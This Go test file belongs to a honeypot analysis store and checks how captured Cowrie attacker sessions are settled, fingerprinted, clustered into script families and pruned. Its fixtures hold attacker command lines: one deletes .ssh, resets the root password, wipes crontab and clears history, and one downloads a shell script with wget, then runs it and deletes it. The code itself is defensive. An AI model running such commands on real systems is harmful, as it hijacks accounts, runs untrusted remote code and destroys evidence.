package store

import (
	"context"
	"database/sql"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/script"
)

func TestSettleOnlyAfterIdleAndResettleOnLateCommands(t *testing.T) {
	s := newTestStore(t, "settle.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-20*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, now.Add(-30*time.Minute), 100); err != nil || n != 0 {
		t.Fatalf("settled before idle: %d %v", n, err)
	}
	// idleBefore must also be past the recorder's updated_at (ingest-time
	// idleness), so settle as of the real clock after recording.
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 1 {
		t.Fatalf("settle: %d %v", n, err)
	}
	var fp1 string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp1)
	cowrieEvent(t, s, "s1", "cowrie:a", "command", "crontab -r", "", "", now.Add(-15*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, _ := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); n != 1 {
		t.Fatal("late command did not re-settle")
	}
	var fp2 string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp2)
	if fp1 == "" || fp1 == fp2 {
		t.Fatalf("fingerprints %q %q", fp1, fp2)
	}
	if err := s.PruneOrphanScripts(ctx); err != nil {
		t.Fatal(err)
	}
	var scripts int
	s.db.QueryRow(`SELECT COUNT(*) FROM scripts`).Scan(&scripts)
	if scripts != 1 {
		t.Fatalf("stale script rows kept: %d", scripts)
	}
}

func TestFamiliesAndMaterialisedView(t *testing.T) {
	s := newTestStore(t, "families.db")
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	base := `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\n%s\n%s" | passwd && crontab -r`
	cowrieEvent(t, s, "s1", "cowrie:a", "command", strings.ReplaceAll(base, "%s", "Abc123xyz789"), "", "", old)
	cowrieEvent(t, s, "s2", "cowrie:b", "command", strings.ReplaceAll(base, "%s", "Qwe987rty654")+" && history -c", "", "", old)
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
		t.Fatal(err)
	}
	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 2 {
		t.Fatalf("assigned %d %v", n, err)
	}
	if err := s.RebuildScriptFamilies(ctx, 3000); err != nil {
		t.Fatal(err)
	}
	var families, links int
	var variants string
	s.db.QueryRow(`SELECT COUNT(*), MAX(variants), MAX(links) FROM script_families`).Scan(&families, &variants, &links)
	if families != 1 || strings.Count(variants, `"fingerprint"`) != 2 || links != 1 {
		t.Fatalf("families=%d links=%d variants=%s", families, links, variants)
	}
}

func TestAssignScriptFamiliesHonoursCancellation(t *testing.T) {
	s := newTestStore(t, "families-cancel.db")
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := s.AssignScriptFamilies(ctx, 500); err == nil {
		t.Fatal("cancelled pass reported success")
	}
}

// A family representative outlives its own sessions while members remain,
// then goes once the last member is pruned.
func TestPruneKeepsRepresentativeWithMembers(t *testing.T) {
	s := newTestStore(t, "prune-rep.db")
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	base := `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\n%s\n%s" | passwd && crontab -r`
	cowrieEvent(t, s, "s1", "cowrie:a", "command", strings.ReplaceAll(base, "%s", "Abc123xyz789"), "", "", old)
	cowrieEvent(t, s, "s2", "cowrie:b", "command", strings.ReplaceAll(base, "%s", "Qwe987rty654")+" && history -c", "", "", old)
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
		t.Fatal(err)
	}
	if _, err := s.AssignScriptFamilies(ctx, 500); err != nil {
		t.Fatal(err)
	}
	var rep string
	if err := s.db.QueryRow(`SELECT fingerprint FROM scripts WHERE family=fingerprint`).Scan(&rep); err != nil {
		t.Fatal(err)
	}
	if _, err := s.db.Exec(`DELETE FROM session_scripts WHERE fingerprint=?`, rep); err != nil {
		t.Fatal(err)
	}
	count := func() int {
		var n int
		s.db.QueryRow(`SELECT COUNT(*) FROM scripts`).Scan(&n)
		return n
	}
	if err := s.PruneOrphanScripts(ctx); err != nil {
		t.Fatal(err)
	}
	if n := count(); n != 2 {
		t.Fatalf("representative with members pruned: %d scripts", n)
	}
	if _, err := s.db.Exec(`DELETE FROM session_scripts`); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 2; i++ {
		if err := s.PruneOrphanScripts(ctx); err != nil {
			t.Fatal(err)
		}
	}
	if n := count(); n != 0 {
		t.Fatalf("orphans kept: %d", n)
	}
}

// An updated_at ahead of the settle clock (wall clock stepped back) must not
// leave the session pending forever.
func TestSettleClockBehindUpdatedAtDoesNotLoop(t *testing.T) {
	s := newTestStore(t, "settle-race.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-20*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.db.Exec(`UPDATE session_scripts SET updated_at=? WHERE session_id='s1'`, formatFixedUTC(now.Add(time.Hour))); err != nil {
		t.Fatal(err)
	}
	// idleBefore past the future updated_at, as a later clock would be.
	if n, err := s.SettleSessionScripts(ctx, now.Add(2*time.Hour), 100); err != nil || n != 1 {
		t.Fatalf("settle: %d %v", n, err)
	}
	var settledAt, updatedAt string
	s.db.QueryRow(`SELECT settled_at, updated_at FROM session_scripts WHERE session_id='s1'`).Scan(&settledAt, &updatedAt)
	if settledAt < updatedAt {
		t.Fatalf("settled_at %s behind updated_at %s: would re-settle every pass", settledAt, updatedAt)
	}
	if n, _ := s.SettleSessionScripts(ctx, now.Add(2*time.Hour), 100); n != 0 {
		t.Fatalf("settled session re-settled without new lines: %d", n)
	}
}

// No prefix rows: a session whose events are old but whose lines were only
// just recorded (history seed in 1000-event windows) is not yet settled.
func TestSettleWaitsForIngestIdle(t *testing.T) {
	s := newTestStore(t, "settle-ingest-idle.db")
	ctx := context.Background()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", time.Now().UTC().Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC().Add(-10*time.Minute), 100); err != nil || n != 0 {
		t.Fatalf("settled a session still being ingested: %d %v", n, err)
	}
	var fp string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp)
	if fp != "" {
		t.Fatalf("prefix fingerprint written: %q", fp)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 1 {
		t.Fatalf("settle after ingest idle: %d %v", n, err)
	}
}

const familyBase = `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\nAbc123xyz789\nAbc123xyz789" | passwd && crontab -r`

// seedFamilyScripts settles one session per command script.
func seedFamilyScripts(t *testing.T, s *Store, cmds []string) {
	t.Helper()
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	for i, c := range cmds {
		cowrieEvent(t, s, fmt.Sprintf("s%d", i), fmt.Sprintf("cowrie:%d", i), "command", c, "", "", old.Add(time.Duration(i)*time.Second))
	}
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != len(cmds) {
		t.Fatalf("settle %d %v", n, err)
	}
}

func scriptFamilies(t *testing.T, s *Store) map[string]string {
	t.Helper()
	rows, err := s.db.Query(`SELECT fingerprint, family FROM scripts`)
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	out := map[string]string{}
	for rows.Next() {
		var fp, fam string
		if err := rows.Scan(&fp, &fam); err != nil {
			t.Fatal(err)
		}
		out[fp] = fam
	}
	if err := rows.Err(); err != nil {
		t.Fatal(err)
	}
	return out
}

func TestFamilyPassBudgetResumesToSameFamilies(t *testing.T) {
	cmds := []string{
		familyBase,
		familyBase + " && history -c",
		familyBase + " && uname -a",
		"cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh",
		"uname -a",
	}
	ctx := context.Background()
	full := newTestStore(t, "families-full.db")
	seedFamilyScripts(t, full, cmds)
	if n, err := full.AssignScriptFamilies(ctx, 500); err != nil || n != len(cmds) {
		t.Fatalf("unbounded pass: %d %v", n, err)
	}
	want := scriptFamilies(t, full)

	saved := familyPassBudget
	familyPassBudget = 0
	t.Cleanup(func() { familyPassBudget = saved })
	b := newTestStore(t, "families-budget.db")
	seedFamilyScripts(t, b, cmds)
	n, err := b.AssignScriptFamilies(ctx, 500)
	if err != nil || n < 1 || n >= len(cmds) {
		t.Fatalf("zero-budget pass must assign a strict, non-empty prefix: %d %v", n, err)
	}
	total := n
	for i := 0; i < len(cmds) && total < len(cmds); i++ {
		n, err := b.AssignScriptFamilies(ctx, 500)
		if err != nil {
			t.Fatal(err)
		}
		total += n
	}
	if total != len(cmds) {
		t.Fatalf("budgeted passes assigned %d of %d", total, len(cmds))
	}
	got := scriptFamilies(t, b)
	if len(got) != len(want) {
		t.Fatalf("got %v want %v", got, want)
	}
	for fp, fam := range want {
		if got[fp] != fam {
			t.Fatalf("family of %s: got %q want %q", fp, got[fp], fam)
		}
	}
	var enc string
	var tc int
	b.db.QueryRow(`SELECT normalized, token_count FROM scripts LIMIT 1`).Scan(&enc, &tc)
	if tc == 0 || tc != len(script.Tokens(enc)) {
		t.Fatalf("token_count %d, want %d", tc, len(script.Tokens(enc)))
	}
}

func TestFamilyPassSkipsRepsOutsideLengthBand(t *testing.T) {
	s := newTestStore(t, "families-band.db")
	ctx := context.Background()
	long := familyBase + " && " + strings.Repeat("rm -rf /tmp/x && ", 20) + "history -c"
	seedFamilyScripts(t, s, []string{long})
	if _, err := s.AssignScriptFamilies(ctx, 500); err != nil {
		t.Fatal(err)
	}
	var longFP string
	var longTC int
	s.db.QueryRow(`SELECT fingerprint, token_count FROM scripts`).Scan(&longFP, &longTC)

	cowrieEvent(t, s, "short", "cowrie:short", "command", "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh", "", "", time.Now().UTC().Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
		t.Fatal(err)
	}
	var shortTC int
	s.db.QueryRow(`SELECT token_count FROM scripts WHERE fingerprint<>?`, longFP).Scan(&shortTC)
	if shortTC == 0 || float64(shortTC)/float64(longTC) >= 0.8 {
		t.Fatalf("precondition: token counts %d vs %d not outside the band", shortTC, longTC)
	}
	var loaded []string
	familyRepLoaded = func(fp string) { loaded = append(loaded, fp) }
	t.Cleanup(func() { familyRepLoaded = nil })
	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 1 {
		t.Fatalf("assign: %d %v", n, err)
	}
	if len(loaded) != 0 {
		t.Fatalf("loaded representatives outside the length band: %v", loaded)
	}
}

// Families never chain through members: with A ~ B, B ~ C and A !~ C, B joins
// A's family and C must become its own representative. AssignScriptFamilies
// enforces this by adding only unassigned scripts as representatives; were B
// added too, C would join through it.
func TestFamilyPassDoesNotChainThroughMembers(t *testing.T) {
	s := newTestStore(t, "families-chain.db")
	ctx := context.Background()
	mk := func(y int) string { // the first y of 10 commands differ from A
		cmds := make([]string, 10)
		for i := range cmds {
			w := "x"
			if i < y {
				w = "y"
			}
			cmds[i] = fmt.Sprintf("mkdir %s%d", w, i)
		}
		return strings.Join(cmds, "; ")
	}
	a, b, c := mk(0), mk(2), mk(5)
	tok := func(cmd string) []string { return script.Tokens(script.Join([]string{script.EncodeLine(cmd)})) }
	ta, tb, tc := tok(a), tok(b), tok(c)
	if script.Distance(ta, tb) > script.FamilyThreshold || script.Distance(tb, tc) > script.FamilyThreshold || script.Distance(ta, tc) <= script.FamilyThreshold {
		t.Fatalf("precondition: A~B %.3f B~C %.3f A~C %.3f", script.Distance(ta, tb), script.Distance(tb, tc), script.Distance(ta, tc))
	}
	seedFamilyScripts(t, s, []string{a, b, c}) // first_seen order A, B, C: A is processed first
	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 3 {
		t.Fatalf("assign: %d %v", n, err)
	}
	fp := func(cmd string) string { return script.Fingerprint(script.Join([]string{script.EncodeLine(cmd)})) }
	fam := scriptFamilies(t, s)
	if fam[fp(a)] != fp(a) || fam[fp(b)] != fp(a) {
		t.Fatalf("A and B must share A's family: %v", fam)
	}
	if fam[fp(c)] != fp(c) {
		t.Fatalf("C chained through member B: family %q, want its own %q", fam[fp(c)], fp(c))
	}
}

// nearestReps takes the representatives nearest in token count, breaking
// equal distances by fingerprint, only inside the length band, and returns
// them in fingerprint order for AssignFamily's tie rule.

// nearestReps takes the representatives nearest in token count, breaking
// equal distances by fingerprint, only inside the length band, and returns
// them in fingerprint order for AssignFamily's tie rule.
func TestNearestRepsIsDeterministic(t *testing.T) {
	b := map[int][]string{100: {"a", "b"}, 99: {"c"}, 101: {"d"}, 120: {"e"}, 130: {"f"}}
	for _, tc := range []struct {
		k    int
		want string
	}{{3, "a,b,c"}, {4, "a,b,c,d"}, {10, "a,b,c,d,e"}, {1, "a"}} {
		if got := strings.Join(nearestReps(b, 100, tc.k), ","); got != tc.want {
			t.Errorf("k=%d: %s, want %s", tc.k, got, tc.want)
		}
	}
}

// A pending script is compared with at most familyNearestReps
// representatives however many sit in its length band: the representative
// set is attacker-driven and each comparison is an O(n*m) distance.
func TestFamilyPassBoundsRepresentativesPerScript(t *testing.T) {
	s := newTestStore(t, "families-nearest.db")
	ts := formatFixedUTC(time.Now())
	const reps = familyNearestReps + 44
	if err := s.WithTx(func(tx *sql.Tx) error {
		for i := 0; i <= reps; i++ {
			enc := script.Join([]string{script.EncodeLine(fmt.Sprintf("mkdir %s", strings.Repeat("q", i+1)))})
			fp, fam := script.Fingerprint(enc), ""
			if i < reps {
				fam = fp
			}
			if _, err := tx.Exec(`INSERT INTO scripts(fingerprint,normalized,display,command_count,distinctive,family,token_count,first_seen,last_seen) VALUES(?,?,'',1,1,?,?,?,?)`,
				fp, enc, fam, len(script.Tokens(enc)), ts, ts); err != nil {
				return err
			}
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	loaded := 0
	familyRepLoaded = func(string) { loaded++ }
	t.Cleanup(func() { familyRepLoaded = nil })
	if n, err := s.AssignScriptFamilies(context.Background(), 500); err != nil || n != 1 {
		t.Fatalf("assign: %d %v", n, err)
	}
	if loaded != familyNearestReps {
		t.Fatalf("loaded %d representatives for one script, want %d", loaded, familyNearestReps)
	}
}
